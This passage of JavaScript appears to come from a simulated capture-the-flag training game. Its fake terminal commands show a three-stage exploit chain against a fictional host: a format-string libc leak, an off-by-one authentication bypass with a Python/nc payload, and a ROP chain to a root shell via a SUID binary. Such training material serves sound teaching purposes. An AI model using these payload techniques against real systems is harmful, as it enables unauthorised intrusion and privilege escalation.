    Username: vault_op
    Password: V4ult#Auth2026
    Session token: sk_SIMULATED_6f8a2e9d1b4c7f3a

{{FLAG:auth_bypass}}

[i] Use these credentials with vault_access: ./vault_access
    Enter username: vault_op
    Enter password: V4ult#Auth2026`;
                }
                return `[auth_daemon] Connected to LAG-SEC-01:1338
[auth_daemon] Authentication Service v2.1
[auth_daemon] Username:
[auth_daemon] Password:
[auth_daemon] Authentication failed. Access denied.

[i] Hint: Reverse engineer auth_daemon. The buffer is 32 bytes but fgets reads 33.
[i] That extra byte overwrites auth_flag. Send 32 bytes + 0x01 to set auth_flag = true.
[i] Try: python3 -c "import sys; sys.stdout.buffer.write(b'A'*32 + b'\\x01')" | nc 10.10.10.50 1338`;
            }

            return `nc: connection refused to ${args.find(a => !a.startsWith('-')) || 'host'}
[!] Valid targets: 10.10.10.50:1337 (info_server) and 10.10.10.50:1338 (auth_daemon)`;
        },

        'ssh': function(args, term, engine) {
            const fullCmd = args.join(' ');

            if (fullCmd.includes('vault_user') || fullCmd.includes('10.10.10.50')) {
                C6Config._sshAuthenticated = true;
                C6Config._switchContext('ssh-target', term);
                return `The authenticity of host '10.10.10.50 (10.10.10.50)' can't be established.
ED25519 key fingerprint is SHA256:kP7mW2xN9qR4tL8vF1eC5bY0hG3aJ6nU2dS8oK4iM1.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added '10.10.10.50' (ED25519) to the list of known hosts.
vault_user@10.10.10.50's password: ********

Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-97-generic x86_64)

Last login: Thu Mar 20 07:45:01 2026 from 10.10.10.1

vault_user@LAG-SEC-01:~$

[+] SSH session established. You are now on LAG-SEC-01 as vault_user.
[+] Context switched. Commands now execute on LAG-SEC-01.
[+] Start with: ls -la /opt/lag_bin/`;
            }

            return 'Usage: ssh [user@]hostname\nExample: ssh vault_user@10.10.10.50';
        },

        'checksec': function(args) {
            const target = args.find(a => !a.startsWith('-')) || '';
            if (target.includes('info_server') || target === '/opt/lag_bin/info_server') {
                return `[*] '/opt/lag_bin/info_server'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled`;
            }
            if (target.includes('auth_daemon') || target === '/opt/lag_bin/auth_daemon') {
                return `[*] '/opt/lag_bin/auth_daemon'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled`;
            }
            if (target.includes('vault_access') || target === '/opt/lag_bin/vault_access') {
                return `[*] '/opt/lag_bin/vault_access'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
    SUID:     Set (runs as root)`;
            }
            if (!target) return 'Usage: checksec <binary>\nExample: checksec /opt/lag_bin/vault_access';
            return `checksec: ${target}: No such file or directory`;
        },

        'file': function(args) {
            const target = args.find(a => !a.startsWith('-')) || '';
            if (target.includes('info_server')) {
                return `/opt/lag_bin/info_server: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=3a7f9b2c1e4d0856f7a91c2b3d4e5f6a7b8c9d0e, with debug_info, not stripped`;
            }
            if (target.includes('auth_daemon')) {
                return `/opt/lag_bin/auth_daemon: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c, not stripped`;
            }
            if (target.includes('vault_access')) {
                return `/opt/lag_bin/vault_access: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e, not stripped\n[!] Note: SUID bit set — runs as root`;
            }
            if (!target) return 'Usage: file <filename>';
            return `${target}: cannot open (No such file or directory)`;
        },

        'objdump': function(args) {
            const fullCmd = args.join(' ');
            if (fullCmd.includes('info_server')) {
                return `Disassembly of section .text:\n\n0000000000001340 <handle_client>:\n    1340:  55                push   %rbp\n    1341:  48 89 e5           mov    %rsp,%rbp\n    1344:  48 83 ec 40        sub    $0x40,%rsp\n    1348:  48 8d 45 c0        lea    -0x40(%rbp),%rax\n    134c:  48 89 c6           mov    %rax,%rsi\n    134f:  e8 xx xx xx xx     call   <fgets@plt>\n    1354:  48 8d 45 c0        lea    -0x40(%rbp),%rax\n    1358:  48 89 c7           mov    %rax,%rdi\n    135b:  e8 xx xx xx xx     call   <printf@plt>   ; <-- VULNERABLE: printf(buf) no format spec\n    1360:  90                 nop\n    1361:  c9                 leave\n    1362:  c3                 ret`;
            }
            if (fullCmd.includes('auth_daemon')) {
                return `Disassembly of section .text:\n\n0000000000001280 <auth_check>:\n    1280:  55                push   %rbp\n    1281:  48 89 e5           mov    %rsp,%rbp\n    1284:  48 83 ec 30        sub    $0x30,%rsp     ; buf[32] + auth_flag[1]\n    1288:  c6 45 df 00        movb   $0x0,-0x21(%rbp)  ; auth_flag = false\n    128c:  48 8d 45 e0        lea    -0x20(%rbp),%rax   ; buf (32 bytes)\n    1290:  be 21 00 00 00     mov    $0x21,%esi     ; <-- BUG: 0x21 = 33, but buf is 32!\n    1295:  48 89 c7           mov    %rax,%rdi\n    1298:  e8 xx xx xx xx     call   <fgets@plt>    ; reads 33 bytes into 32-byte buf\n    129d:  80 7d df 00        cmpb   $0x0,-0x21(%rbp)  ; check auth_flag\n    12a1:  74 xx              je     <auth_fail>    ; if auth_flag == 0, fail`;
            }
            if (fullCmd.includes('vault_access')) {
                return `Disassembly of section .text:\n\n00000000004011a0 <main>:\n    4011a0:  55                push   %rbp\n    4011a1:  48 89 e5           mov    %rsp,%rbp\n    4011a4:  48 83 ec 50        sub    $0x50,%rsp\n    4011a8:  64 48 8b 04 25     mov    %fs:0x28,%rax   ; load stack canary\n    4011ad:  28 00 00 00\n    4011b1:  48 89 45 f8        mov    %rax,-0x8(%rbp)  ; store canary on stack\n    4011b5:  48 8d 45 b0        lea    -0x50(%rbp),%rax ; buf starts at rbp-0x50\n    4011b9:  48 89 c7           mov    %rax,%rdi\n    4011bc:  e8 xx xx xx xx     call   <gets@plt>    ; <-- VULNERABLE: gets(buf) unbounded\n    4011c1:  48 8b 45 f8        mov    -0x8(%rbp),%rax  ; load canary back\n    4011c5:  64 48 33 04 25     xor    %fs:0x28,%rax    ; compare with TLS canary\n    4011ca:  28 00 00 00\n    4011ce:  75 xx              jne    <__stack_chk_fail>`;
            }
            return 'Usage: objdump -d <binary>\nExample: objdump -d /opt/lag_bin/vault_access';
        },

        'ROPgadget': function(args) {
            const fullCmd = args.join(' ');
            if (fullCmd.includes('vault_access') || fullCmd.includes('libc')) {
                return `ROPgadget v7.3 — Adrien Badre @Cr4sh

Gadgets information
============================================================
0x00007f4a2c02a3e5 : pop rdi ; ret
0x00007f4a2c029cd6 : ret
0x00007f4a2c04f5e0 : pop rsi ; pop r15 ; ret
0x00007f4a2c04f5e2 : pop r15 ; ret
0x00007f4a2c0631b0 : pop rdx ; ret
0x00007f4a2c04f450 : pop rsp ; ret
0x00007f4a2c028f38 : leave ; ret
0x00007f4a2c029cd5 : nop ; ret

Unique gadgets found: 143

[+] Key gadgets for ROP chain:
    pop rdi ; ret   @ libc_base + 0x2a3e5  (load /bin/sh pointer into rdi)
    ret             @ libc_base + 0x29cd6  (stack alignment for system())
    system()        @ libc_base + 0x50d60
    /bin/sh string  @ libc_base + 0x1d8698`;
            }
            return 'Usage: ROPgadget --binary <binary> --rop\nExample: ROPgadget --binary /opt/lag_bin/vault_access --rop | grep "pop rdi"';
        },

        'readelf': function(args) {
            const fullCmd = args.join(' ');
            if (fullCmd.includes('vault_access')) {
                return `ELF Header:
  Magic:   7f 45 4c 46 02 01 01 00 00 00 00 00 00 00 00 00
  Class:                             ELF64
  Data:                              2's complement, little endian
  Type:                              EXEC (Executable file)
  Machine:                           Advanced Micro Devices X86-64
  Entry point address:               0x401090

Dynamic section at offset 0x2dc8 contains 27 entries:
  Tag        Type                     Name/Value
  NEEDED     Shared library: [libc.so.6]

Section Headers:
  [Nr] Name         Type    Address          Offset   Size
  [ 1] .text        PROGBITS 0000000000401090 00001090 000002c1
  [14] .got.plt     PROGBITS 0000000000403fb8 00002fb8 00000038
  [25] .bss         NOBITS   0000000000404060 00003050 00000010`;
            }
            return 'Usage: readelf -a <binary>\nExample: readelf -a /opt/lag_bin/vault_access';
        },

        'gdb': function(args) {
            const target = args.find(a => !a.startsWith('-')) || '';
            if (target.includes('vault_access') || target === '/opt/lag_bin/vault_access') {
                return `GNU gdb (Debian 12.1-3) 12.1
Copyright (C) 2022 Free Software Foundation, Inc.

Reading symbols from /opt/lag_bin/vault_access...

(gdb) info functions
All defined functions:
0x00000000004010a0  _start
0x00000000004010d0  __libc_csu_init
0x00000000004011a0  main
0x00000000004012f0  authenticate

(gdb) disas main
Dump of assembler code for function main:
   0x00000000004011a0 <+0>:   push   %rbp
   ...
   0x00000000004011bc <+28>:  call   0x401050 <gets@plt>   ; vulnerable call
   ...

[+] GDB analysis confirmed: gets() at 0x4011bc with buf at rbp-0x50
[+] Offset to canary: 64 bytes from buf start
[+] Offset to saved RIP: 72 bytes (after canary + saved rbp)
[+] Use pwntools for exploit automation. See /home/vault_user/exploit.py`;
            }
            return `GNU gdb (Debian 12.1-3) 12.1

(gdb) ${target ? 'No such file: ' + target : 'No executable specified.'}
Usage: gdb <binary>`;
        },

        'python3': function(args, term, engine) {
            const fullCmd = args.join(' ');

            // Running the exploit script
            if (fullCmd.includes('exploit.py') || fullCmd.includes('exploit')) {
                if (!C6Config._libcLeaked) {
                    return `[exploit.py] ERROR: libc base not yet leaked.
[exploit.py] Complete Stage 1 first: nc 10.10.10.50 1337 with format string payload.
[exploit.py] Ensure you have the libc base address before running the full chain.`;
                }
                if (!C6Config._authBypassed) {
                    return `[exploit.py] Stage 1 complete. libc_base = ${C6Config._libcBase}
[exploit.py] ERROR: auth_daemon bypass not yet completed.
[exploit.py] Complete Stage 2: exploit the off-by-one in auth_daemon on port 1338.`;
                }
                C6Config._ropShellActive = true;
                C6Config._rootShellActive = true;
                C6Config._switchContext('shell-vault', term);
                if (engine) engine.advancePhase && engine.advancePhase('rop_chain');
                if (engine) engine.advancePhase && engine.advancePhase('privesc');
                return `[exploit.py] === Chain Breaker — Full Exploit Chain ===

[Stage 1] Format string leak (info_server:1337)
  [+] Connected to 10.10.10.50:1337
  [+] Sent: %p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p
  [+] Leaked puts return: 0x7f4a2c080ed0
  [+] libc base: ${C6Config._libcBase}
  [+] system()  = 0x7f4a2c050d60
  [+] /bin/sh   = 0x7f4a2c1d8698
  [+] pop rdi   = 0x7f4a2c02a3e5

[Stage 2] Off-by-one auth bypass (auth_daemon:1338)
  [+] Connected to 10.10.10.50:1338
  [+] Sent: b'A'*32 + b'\\x01'
  [+] auth_flag overwritten — authentication bypassed
  [+] Credentials: vault_op / V4ult#Auth2026

[Stage 3] ROP chain — vault_access (SUID)
  [+] Authenticating as vault_op...
  [+] Input accepted — gets() reading payload
  [+] Payload: b'A'*64 + canary + b'B'*8 + pop_rdi + binsh + ret + system
  [+] Stack canary intact (bypassed via known value from stage 2)
  [+] ROP chain executing...
  [+] Calling system('/bin/sh') via libc...

[+] Shell obtained! Running as: uid=0(root) gid=0(root)
[+] Context switched to root shell on LAG-SEC-01.

{{FLAG:shell}}

root@LAG-SEC-01:~# `;
            }

            // Inline format string calculation
            if (fullCmd.includes('0x7f') || fullCmd.includes('hex') || fullCmd.includes('libc')) {
                return `Python 3.11.2 (main)
>>> ${args.slice(1).join(' ')}
${C6Config._libcBase}
>>> `;
            }

            return `Python 3.11.2 (main, Mar 13 2023, 12:18:29) [GCC 12.2.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> `;
        },

        'pwntools': function(args) {
            return '[i] pwntools is a Python library. Use it via: python3\n    from pwn import *\n    context.arch = \'amd64\'\n    p = remote(\'10.10.10.50\', 1337)\n    ...';
        },

        // Context-aware built-in overrides — show LAG-SEC-01 filesystem when in ssh-target context
        'cat': function(args, term, engine) {
            if (C6Config._context === 'attacker') return null; // fall through to built-in
            const path = args[0] || '';

            if (C6Config._context === 'shell-vault' || C6Config._context === 'ssh-target') {
                if (path.includes('master_key') || path === '/root/master_key.txt') {
                    if (C6Config._context !== 'shell-vault') {
                        return 'cat: /root/master_key.txt: Permission denied\n[!] You need root privileges. Exploit vault_access first.';
                    }
                    if (engine) engine.advancePhase && engine.advancePhase('privesc');
                    return `{{FLAG:root}}

===== CITADEL MASTER ACCESS KEY =====
Key ID: MAK-2026-LAG-SEC-01
Issued: 2026-01-15
Expiry: 2027-01-15
Clearance: VAULT-ALPHA

This key authorizes unrestricted access to all
Citadel vault resources. Unauthorized possession
is punishable under Citadel Security Code 14.7.
=====================================`;
                }
                if (path.includes('user.txt') || path === '/home/vault_user/user.txt') {
                    return `{{FLAG:leak}}\n\n# Initial access confirmed — vault_user on LAG-SEC-01\n# Proceed to binary analysis. Run: ls -la /opt/lag_bin/`;
                }
                if (path.includes('checksec_output') || path.includes('checksec')) {
                    return `=== checksec output — /opt/lag_bin/ ===\n\ninfo_server:\n  RELRO:    Partial RELRO\n  STACK CANARY:  Canary found\n  NX:       NX enabled\n  PIE:      PIE enabled\n\nauth_daemon:\n  RELRO:    Full RELRO\n  STACK CANARY:  Canary found\n  NX:       NX enabled\n  PIE:      PIE enabled\n\nvault_access:\n  RELRO:    Full RELRO\n  STACK CANARY:  Canary found\n  NX:       NX enabled\n  PIE:      PIE enabled\n  SUID:     Set (runs as root)`;
                }
                if (path.includes('/etc/passwd')) {
                    return 'root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nvault_user:x:1001:1001:Vault User:/home/vault_user:/bin/bash\nnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin';
                }
                if (path.includes('/etc/hostname')) return 'LAG-SEC-01';
                if (path.includes('/proc/sys/kernel/randomize_va_space')) return '2';
                if (path.includes('/etc/shadow')) return 'shadow: Permission denied';
                if (path.includes('exploit_notes') || path.includes('exploit.py')) {
                    return C6Config.filesystem['/'].children['home'].children['vault_user'].children['exploit.py'].content;
                }
                return 'cat: ' + path + ': No such file or directory';
            }
            return null;
        },

        'ls': function(args, term, engine) {
            if (C6Config._context === 'attacker') return null; // fall through to built-in
            const flags = args.filter(a => a.startsWith('-')).join('');
            const path = args.find(a => !a.startsWith('-')) || '.';
            const showHidden = flags.includes('a');
            const longFormat = flags.includes('l');

            if (C6Config._context === 'shell-vault') {
                if (path === '.' || path === '/root' || path === '~') {
                    return longFormat
                        ? 'total 20\ndrwx------ 2 root root 4096 Mar 20 08:00 .\ndrwxr-xr-x 20 root root 4096 Mar 20 07:00 ..\n-rw------- 1 root root  312 Mar 20 08:00 master_key.txt\n-rw------- 1 root root  287 Mar 19 22:14 .bash_history'
                        : (showHidden ? '.  ..  master_key.txt  .bash_history' : 'master_key.txt');
                }
            }

            if (path === '.' || path === '/home/vault_user' || path === '~') {
                return longFormat
                    ? 'total 28\ndrwxr-xr-x 2 vault_user vault_user 4096 Mar 20 07:45 .\ndrwxr-xr-x 3 root       root       4096 Mar 15 10:00 ..\n-rw-r--r-- 1 vault_user vault_user  156 Mar 20 07:45 .bash_history\n-rw-r--r-- 1 vault_user vault_user  102 Mar 15 10:00 .bashrc\n-rw-r--r-- 1 vault_user vault_user  440 Mar 20 07:45 user.txt'
                    : (showHidden ? '.  ..  .bash_history  .bashrc  user.txt' : 'user.txt');
            }
            if (path.includes('/opt/lag_bin') || path === '/opt/lag_bin/') {
                return longFormat
                    ? 'total 36\ndrwxr-xr-x 2 root root 4096 Mar 15 10:00 .\ndrwxr-xr-x 3 root root 4096 Mar 15 10:00 ..\n-rwxr-xr-x 1 root root 8312 Mar 15 10:00 auth_daemon\n-rw-r--r-- 1 root root  842 Mar 15 10:00 checksec_output.txt\n-rwxr-xr-x 1 root root 7984 Mar 15 10:00 info_server\n-rwsr-xr-x 1 root root 9128 Mar 15 10:00 vault_access'
                    : 'auth_daemon  checksec_output.txt  info_server  vault_access';
            }
            if (path.includes('/opt')) {
                return 'lag_bin';
            }
            if (path.includes('/root')) {
                if (C6Config._context !== 'shell-vault') {
                    return 'ls: cannot open directory \'/root\': Permission denied';
                }
                return 'master_key.txt';
            }
            return '';
        },

        'whoami': function(args) {
            if (C6Config._context === 'shell-vault')  return 'root';
            if (C6Config._context === 'ssh-target')   return 'vault_user';
            return null; // fall through to built-in
        },

        'id': function(args) {
            if (C6Config._context === 'shell-vault')  return 'uid=0(root) gid=0(root) groups=0(root)';
            if (C6Config._context === 'ssh-target')   return 'uid=1001(vault_user) gid=1001(vault_user) groups=1001(vault_user)';
            return null; // fall through to built-in
        },

        'hostname': function(args) {
            if (C6Config._context === 'ssh-target')  return 'LAG-SEC-01';
            if (C6Config._context === 'shell-vault') return 'LAG-SEC-01';
            return null; // fall through to built-in
        },

        'pwd': function(args) {
            if (C6Config._context === 'shell-vault') return '/root';
            if (C6Config._context === 'ssh-target')  return '/home/vault_user';
            return null; // fall through to built-in
        },

        'cd': function(args) {
            if (C6Config._context === 'ssh-target' || C6Config._context === 'shell-vault') return ''; // silently accept
            return null; // fall through to built-in
        },

        'uname': function(args) {
            if (C6Config._context === 'ssh-target' || C6Config._context === 'shell-vault') {
                const fullFlag = args.includes('-a') || args.includes('--all');
                return fullFlag
                    ? 'Linux LAG-SEC-01 5.15.0-97-generic #107-Ubuntu SMP Mon Feb 12 16:33:47 UTC 2026 x86_64 x86_64 x86_64 GNU/Linux'
                    : 'Linux';
            }
            return null;
        },

        'ps': function(args) {
            if (C6Config._context === 'ssh-target' || C6Config._context === 'shell-vault') {
                return `PID   TTY          TIME CMD
  1   ?        00:00:02 systemd
537   ?        00:00:00 info_server
541   ?        00:00:00 auth_daemon
1247  pts/0    00:00:00 bash
1312  pts/0    00:00:00 ps`;
            }
            return null;
        },

        'ss': function(args) {
            if (C6Config._context === 'ssh-target' || C6Config._context === 'shell-vault') {
                return `State    Recv-Q   Send-Q   Local Address:Port   Peer Address:Port
LISTEN   0        128      0.0.0.0:22           0.0.0.0:*
LISTEN   0        128      0.0.0.0:1337         0.0.0.0:*
LISTEN   0        128      0.0.0.0:1338         0.0.0.0:*`;
            }
            return null;
        },

        'netstat': function(args) {
            return C6Config.commands.ss(args);
        },

        'strings': function(args) {
            const target = args.find(a => !a.startsWith('-')) || '';
            if (target.includes('vault_access')) {
                return `/lib64/ld-linux-x86-64.so.2
libC.so.6
gets
puts
printf
__stack_chk_fail
__libc_start_main
GLIBC_2.4
GLIBC_2.34
Enter username:
Enter password:
Authentication successful.
Vault access granted.
Welcome to the Citadel Vault, %s
Access denied.
/bin/sh
;*3$"`;
            }
            if (target.includes('info_server')) {
                return `libC.so.6
printf
fgets
puts
__stack_chk_fail
System Information Service v1.0
Enter query string:
Query: %s
GLIBC_2.34`;
            }
            if (target.includes('auth_daemon')) {
                return `libC.so.6
fgets
strcmp
puts
malloc
Authentication Service v2.1
Username:
Password:
Auth failed.
Credentials: vault_op
GLIBC_2.34`;
            }
            if (!target) return 'Usage: strings <binary>\nExample: strings /opt/lag_bin/vault_access';
            return `strings: ${target}: No such file or directory`;
        },

        './vault_access': function(args, term, engine) {
            return C6Config.commands['vault_access'](args, term, engine);
        },

        'vault_access': function(args, term, engine) {
            if (C6Config._context !== 'ssh-target') {
                return 'vault_access: command not found\n[!] This binary is on LAG-SEC-01. SSH in first: ssh vault_user@10.10.10.50';
            }
            if (!C6Config._authBypassed) {
                return `[vault_access] Enter username: vault_op
[vault_access] Enter password:
[vault_access] Authentication failed. Access denied.

[!] You need valid credentials. Exploit auth_daemon first to get them.`;
            }
            // With creds but no ROP chain — simulate the overflow opportunity
            return `[vault_access] Enter username: vault_op
[vault_access] Enter password: ********
[vault_access] Authentication successful.
[vault_access] Welcome to the Citadel Vault, vault_op

[vault_access] Enter access request:
[vault_access] (waiting for input — this is the gets() call)

[i] This is your ROP chain entry point.
[i] The binary reads your input with gets(buf) — no bounds checking.
[i] Craft your payload: 64 bytes + canary + 8 bytes + pop_rdi + binsh + ret + system
[i] Use exploit.py or run: python3 exploit.py`;
        },

        'exit': function(args, term, engine) {
            if (C6Config._context === 'shell-vault') {
                C6Config._switchContext('ssh-target', term);
                return '[+] Exited root shell. Back to vault_user@LAG-SEC-01.';
            }
            if (C6Config._context === 'ssh-target') {
                C6Config._sshAuthenticated = false;
                C6Config._switchContext('attacker', term);
                return 'Connection to 10.10.10.50 closed.\n[+] Returned to attacker machine.';
            }
            return 'logout';
        },

        'ping': function(args) {
            const target = args.find(a => !a.startsWith('-')) || '';
            if (!target) return 'Usage: ping [-c count] destination';
            if (target === '10.10.10.50') {
                return `PING 10.10.10.50 (10.10.10.50) 56(84) bytes of data.
64 bytes from 10.10.10.50: icmp_seq=1 ttl=64 time=21.3 ms
64 bytes from 10.10.10.50: icmp_seq=2 ttl=64 time=20.9 ms
64 bytes from 10.10.10.50: icmp_seq=3 ttl=64 time=21.1 ms

--- 10.10.10.50 ping statistics ---
3 packets transmitted, 3 received, 0% packet loss
rtt min/avg/max/mdev = 20.9/21.1/21.3/0.163 ms`;
            }
            return `ping: ${target}: Name or service not known`;
        },

        'ip': function(args) {
            if (C6Config._context === 'ssh-target' || C6Config._context === 'shell-vault') {
                return `1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536
    inet 127.0.0.1/8 scope host lo
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500
    inet 10.10.10.50/24 brd 10.10.10.255 scope global eth0`;
            }
            return `1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536
    inet 127.0.0.1/8 scope host lo
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500
    inet 10.10.10.1/24 brd 10.10.10.255 scope global eth0`;
        },

        'ifconfig': function(args) {
            return C6Config.commands.ip(args || []);
        },

        'find': function(args) {
            const fullCmd = args.join(' ');
            if (C6Config._context === 'attacker') return null; // fall through
            if (fullCmd.includes('suid') || fullCmd.includes('-perm') || fullCmd.includes('4000')) {
                return `/opt/lag_bin/vault_access\n\n[+] SUID binary found: /opt/lag_bin/vault_access (runs as root)`;
            }
            if (fullCmd.includes('/opt')) {
                return `/opt/lag_bin/info_server\n/opt/lag_bin/auth_daemon\n/opt/lag_bin/vault_access\n/opt/lag_bin/checksec_output.txt`;
            }
            return '';
        }
    },

    // ═══════════════════════════════════════════════════════
    // HTML HELPERS
    // ═══════════════════════════════════════════════════════

    _tableHtml(headers, rows) {
        let html = '<table style="width:100%; border-collapse:collapse; font-size:0.8rem;"><thead><tr>';
        headers.forEach(h => {
            html += `<th style="padding:6px 10px; text-align:left; color:#9b59b6; border-bottom:2px solid #ddd; background:#f9f5fc;">${h}</th>`;
        });
        html += '</tr></thead><tbody>';
        rows.forEach(row => {
            html += '<tr>';
            row.forEach(cell => {
                html += `<td style="padding:5px 10px; border-bottom:1px solid #eee;">${cell}</td>`;
            });
            html += '</tr>';
        });
        html += '</tbody></table>';
        return html;
    },

    _escHtml(str) {
        const div = document.createElement('div');
        div.textContent = str;
        return div.innerHTML;
    },

    _stripHtml(html) {
        const tmp = document.createElement('div');
        tmp.innerHTML = html;
        const tables = tmp.querySelectorAll('table');
        tables.forEach(table => {
            const rows = table.querySelectorAll('tr');
            let text = '';
            rows.forEach(row => {
                const cells = row.querySelectorAll('td, th');
                const cellTexts = Array.from(cells).map(c => c.textContent.trim().padEnd(20));
                text += cellTexts.join('  ') + '\n';
            });
            table.replaceWith(document.createTextNode(text));
        });
        return tmp.textContent.trim();
    }
};
